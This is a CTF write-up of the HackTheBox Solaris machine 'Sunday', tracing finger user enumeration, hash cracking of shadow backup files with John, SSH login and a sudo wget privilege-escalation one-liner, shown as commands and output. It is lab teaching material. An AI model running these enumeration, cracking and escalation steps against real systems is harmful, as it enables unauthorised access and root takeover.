---
title: Write-up Sunday on HTB
author: eMVee
date: 2024-04-02 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, finger, solaris, wget]
render_with_liquid: false
---

The "Sunday" machine is a Solaris system that presents an interesting challenge for pentesters. A initial port scan reveals several open ports, including 79 (finger), 111 (rpcbind), 22022 (SSH). I  this box we should enumerate users with finger, crack hashes for passwords and gain privileges via sudo permissions on wget. Overall, the "Sunday" machine is a great opportunity to practice common Linux privilege escalation methods through proper enumeration and vulnerability chaining. 


## Getting started
As usual we should create a project folder and assign the IP address of the target to a variable in the terminal.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB        

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mkdir Sunday       

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ cd Sunday 

┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ ip=10.129.75.54
```

## Enumeration
Next step is to enumerate as much as possible. In this case we should run a simple ping request to see if the target does respond to our request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ ping $ip -c 3
PING 10.129.75.54 (10.129.75.54) 56(84) bytes of data.
64 bytes from 10.129.75.54: icmp_seq=1 ttl=254 time=6.78 ms
64 bytes from 10.129.75.54: icmp_seq=2 ttl=254 time=6.82 ms
64 bytes from 10.129.75.54: icmp_seq=3 ttl=254 time=8.15 ms

--- 10.129.75.54 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2018ms
rtt min/avg/max/mdev = 6.779/7.247/8.147/0.636 ms
```

The `ttl` value is different with a value of `254`.  This might be a good indicator that this machine is not a normal Windows or Linux Operating System.

 The common default TTL values are:
- 64 – Linux/MAC OSX systems
- 128 – Windows systems
- 255 – Network devices like routers

Let's run a port scan with nmap to identify open ports and services on the target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-02 13:26 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Warning: 10.129.75.54 giving up on port because retransmission cap hit (6).
Stats: 0:08:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.42% done; ETC: 13:52 (0:17:43 remaining)
Stats: 0:18:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 70.81% done; ETC: 13:51 (0:07:33 remaining)
Stats: 0:22:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 85.01% done; ETC: 13:52 (0:03:54 remaining)
Nmap scan report for 10.129.75.54
Host is up (0.0069s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
79/tcp    open     finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open     rpcbind        2-4 (RPC #100000)
515/tcp   open     printer
2534/tcp  filtered combox-web-acc
6787/tcp  open     http           Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
22022/tcp open     ssh            OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
31213/tcp filtered unknown
36736/tcp filtered unknown
51608/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94%I=7%D=4/2%Time=660BF1FE%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=4/2%OT=79%CT=1%CU=31691%PV=Y%DS=2%DC=T%G=Y%TM=660BF267
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7
OS:)SEQ(SP=104%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR=
OS:109%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=ST11M53CNW2%O2=ST11M53CNW2%O3=NNT11M
OS:53CNW2%O4=ST11M53CNW2%O5=ST11M53CNW2%O6=ST11M53C)WIN(W1=FA4C%W2=FA4C%W3=
OS:FA38%W4=FA3B%W5=FA3B%W6=FFF7)ECN(R=Y%DF=Y%T=3C%W=FB40%O=M53CNNSNW2%CC=Y%
OS:Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09
OS:%S=O%A=S+%F=AS%O=ST11M53CNW2%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=Y%T=FF%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   6.46 ms 10.10.14.1
2   6.54 ms 10.129.75.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1818.01 seconds

```
We did discover several open ports and services on our target with nnmap. We should add  the following items to our notes.
- OS: Unknown
- Port 79
	- finger
- Port 111
	- RPC
- Port 515
	- Printer?
- 6787
	- HTTP
	- Apache
- Port 22022
	- SSH
	- OpenSSH 8.4

Since port 79 is open, we could try to enumerate users via finger. The Finger protocol is typically used to retrieve information such as a user's full name, email address, and the time they last logged in. Port 79 is the default port used for the Finger protocol, so let's get started with enumerating users on the target. First we check the response of a user who probably does not exist.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ finger emvee@$ip
Login       Name               TTY         Idle    When    Where
emvee                 ???

```
Let's try it as well without any username to see how the system responds.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ finger @$ip     
No one logged on

```
Since it looks like a Linux operating system we can try to use root as a valid user.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ echo "root" | nc -vn $ip 79 
(UNKNOWN) [10.129.75.54] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7 15:18>

```
This user does exists. We should get the `finger-user-enum.pl` script from [pentestmonkey](https://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz).
Let's try to run the scriupt with the root user to see how the response of the system looks like.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday/finger-user-enum-1.0]
└─$ ./finger-user-enum.pl -u root -t $ip
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Tue Apr  2 14:31:08 2024 #########
root@10.129.75.54: root     Super-User            console      <Dec  7 15:18>..
######## Scan completed at Tue Apr  2 14:31:08 2024 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)

```
We got a valid user. Now we should enumerate with a user list to identify valid users on the system.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday/finger-user-enum-1.0]
└─$ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $ip 
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Tue Apr  2 14:32:34 2024 #########
access@10.129.75.54: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.75.54: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.129.75.54: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.129.75.54: bin             ???                         < .  .  .  . >..
dee dee@10.129.75.54: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.129.75.54: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.129.75.54: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.129.75.54: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.129.75.54: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.129.75.54: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.129.75.54: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.129.75.54: root     Super-User            console      <Dec  7 15:18>..
sammy@10.129.75.54: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.129.75.54: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.129.75.54: sys             ???                         < .  .  .  . >..
zsa zsa@10.129.75.54: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Tue Apr  2 14:34:47 2024 #########
16 results.

10177 queries in 133 seconds (76.5 queries / sec)

```

We have enumerated in three users in total. We should add them to our notes.
- root
- sammy
- sunny

## Initial access
We should try some default passwords like username:username or username:hostname to see if we get access to the system.
If this does not work we can try to brute force the password on the SSH service with Hydra.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ ssh sunny@$ip -p 22022
(sunny@10.129.75.54) Password: 
Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
sunny@sunday:~$ 

```
We are lucky in a few tries we discovered the password for sunny.
- Password: `sunday`

Next we should start enumerating on the system.
```bash
sunny@sunday:~$ whoami
sunny
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
sunny@sunday:~$ pwd
/home/sunny
sunny@sunday:~$ ls -la
total 19
drwxr-xr-x   2 sunny    staff          8 Apr 13  2022 .
dr-xr-xr-x   4 root     root           4 Dec 19  2021 ..
-rw-------   1 sunny    staff        402 Apr 13  2022 .bash_history
-r--r--r--   1 sunny    staff        159 Dec 19  2021 .bashrc
-rw-r--r--   1 sunny    staff        568 Dec 19  2021 .profile
-rw-r--r--   1 sunny    staff        156 Dec 19  2021 local.cshrc
-rw-r--r--   1 sunny    staff         97 Dec 19  2021 local.login
-rw-r--r--   1 sunny    staff        119 Dec 19  2021 local.profile
sunny@sunday:~$ 

```
Till now we did not discover any juicy information in the home directory. We should start from the root to see what juicy information might be hidden on the system.

```bash
sunny@sunday:~$ ls -la /
total 918
drwxr-xr-x  25 root     sys           28 Apr  2 11:25 .
drwxr-xr-x  25 root     sys           28 Apr  2 11:25 ..
drwxr-xr-x   2 root     root           4 Dec 19  2021 backup
lrwxrwxrwx   1 root     root           9 Dec  8  2021 bin -> ./usr/bin
drwxr-xr-x   5 root     sys            9 Dec  8  2021 boot
drwxr-xr-x   2 root     root           4 Dec 19  2021 cdrom
drwxr-xr-x 220 root     sys          220 Apr  2 11:24 dev
drwxr-xr-x   4 root     sys            5 Apr  2 11:24 devices
drwxr-xr-x  83 root     sys          176 Apr  2 13:13 etc
drwxr-xr-x   3 root     sys            3 Dec  8  2021 export
dr-xr-xr-x   4 root     root           4 Dec 19  2021 home
drwxr-xr-x  21 root     sys           21 Dec  8  2021 kernel
drwxr-xr-x  12 root     bin          276 Dec  7 01:10 lib
drwxr-xr-x   2 root     root           3 Apr  2 11:25 media
drwxr-xr-x   2 root     sys            2 Aug 17  2018 mnt
dr-xr-xr-x   1 root     root           1 Apr  2 11:25 net
dr-xr-xr-x   1 root     root           1 Apr  2 11:25 nfs4
drwxr-xr-x   2 root     sys            2 Aug 17  2018 opt
drwxr-xr-x   4 root     sys            4 Aug 17  2018 platform
dr-xr-xr-x 243 root     root      480032 Apr  2 13:13 proc
drwx------   2 root     root          11 Apr  2 11:25 root
drwxr-xr-x   3 root     root           3 Dec  7 01:03 rpool
lrwxrwxrwx   1 root     root          10 Dec  8  2021 sbin -> ./usr/sbin
drwxr-xr-x   7 root     root           7 Dec  8  2021 system
drwxrwxrwt   3 root     sys          276 Apr  2 13:13 tmp
drwxr-xr-x  30 root     sys           42 Dec  7 01:10 usr
drwxr-xr-x  42 root     sys           51 Dec  8  2021 var
-r--r--r--   1 root     root      298504 Aug 17  2018 zvboot
```
There is a `backup` folder in the root. We should check if there are any files stored here.

```bash
sunny@sunday:~$ ls -la /backup/
total 28
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Apr  2 11:25 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup

```
There are two files stored. Let's view both of the files to see if we can find something here.
The second file sounds the most interesting if there is a backup file created of the shadow file.

```bash
sunny@sunday:~$ cat /backup/agent22.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:~$ cat /backup/shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```
We got two hashes of two users. We can try to crack them with John the Ripper.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ nano hash 

┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ cat hash 
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

┌──(emvee㉿kali)-[~/Documents/HTB/Sunday]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (sunny)     
cooldude!        (sammy)     
2g 0:00:00:21 DONE (2024-04-02 15:17) 0.09272g/s 9494p/s 9684c/s 9684C/s domonique1..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                      
```
Looks like we were able to crack the two hashes. Now we should add the new information to our notes.
- sunny:sunday
- sammy:cooldude!

Now we can change the user to sammy and continue enumerating on the system.
```bash
sunny@sunday:~$ su sammy
Password: 
Warning: 2 failed authentication attempts since last successful authentication.  The latest at Tue Apr 02 12:43 2024.
sammy@sunday:~$ id
uid=100(sammy) gid=10(staff)
sammy@sunday:~$ whoami
sammy

```
We are sammy on the system, let's enumerate the home directory of the users to see if we can find the user flag here.

```bash
sammy@sunday:~$ ls -ahlR /home
/home:
total 30
dr-xr-xr-x   4 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Apr  2 11:25 ..
drwxr-xr-x   2 root     root           3 Dec 19  2021 sammy
drwxr-xr-x   2 sunny    staff          8 Apr 13  2022 sunny

/home/sammy:
total 8
drwxr-xr-x   2 root     root           3 Dec 19  2021 .
dr-xr-xr-x   4 root     root           4 Dec 19  2021 ..
-rw-r-----   1 sammy    root          33 Apr  2 11:25 user.txt

/home/sunny:
total 19
drwxr-xr-x   2 sunny    staff          8 Apr 13  2022 .
dr-xr-xr-x   4 root     root           4 Dec 19  2021 ..
-rw-------   1 sunny    staff        402 Apr 13  2022 .bash_history
-r--r--r--   1 sunny    staff        159 Dec 19  2021 .bashrc
-rw-r--r--   1 sunny    staff        568 Dec 19  2021 .profile
-rw-r--r--   1 sunny    staff        156 Dec 19  2021 local.cshrc
-rw-r--r--   1 sunny    staff         97 Dec 19  2021 local.login
-rw-r--r--   1 sunny    staff        119 Dec 19  2021 local.profile
sammy@sunday:~$ 

```
The user flag is stored in the home directory of sammy. We can capture the flag with a simple cat command.

```bash
sammy@sunday:~$ cat /home/sammy/user.txt 
< HERE IS THE USER FLAG >

```
We did not check if we have sudo permissions with the user(s) yet. Let's check the `sudo -l` command to see what we can execute as sudoer.
```bash
sammy@sunday:~$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```
We are lucky since we can run sudo on wget. There is a post on [GTFObins wget](https://gtfobins.github.io/gtfobins/wget/) how we can escalate our privileges so we gain root privileges on the system.

## Privilege escalation
To gain more privileges with wget, we just have to follow the steps described on GTFObins.
```bash
sammy@sunday:~$ TF=$(mktemp)
sammy@sunday:~$ chmod +x $TF
sammy@sunday:~$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sammy@sunday:~$ sudo /usr/bin/wget --use-askpass=$TF 0
root@sunday:/home/sunny# 

```
It looks like we are root on the system. Now we should only capture the root flag as proof.
```bash
root@sunday:/home/sunny# whoami                                                    root
root@sunday:/home/sunny# id                                                        uid=0(root) gid=0(root)
root@sunday:/home/sunny# hostname                                                  sunday
root@sunday:/home/sunny# cat /root/root.txt                                        < HERE IS THE ROOT FLAG >

```

This was an easy (old) machine. I never used finger before. All the information about using finger could be found on [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger).